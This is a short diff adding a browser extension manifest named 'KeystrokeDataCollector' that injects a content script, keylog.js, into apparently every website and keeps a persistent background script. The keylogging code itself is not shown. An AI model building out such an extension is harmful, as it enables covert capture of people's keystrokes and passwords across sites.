@@ -1,0 +1,17 @@
+{
+    "name": "KeystrokeDataCollector",
+    "version": "1.0.0",
+    "description": "Generates Keystroke Data",
+    "permissions": ["activeTab"],
+    "background": {
+        "scripts": ["background.js"],
+        "persistent": true
+    },
+    "manifest_version": 2,
+    "content_scripts": [
+        {
+            "matches": ["*://*./*"],
+            "js": ["keylog.js"]
+        }
+    ]
+    }
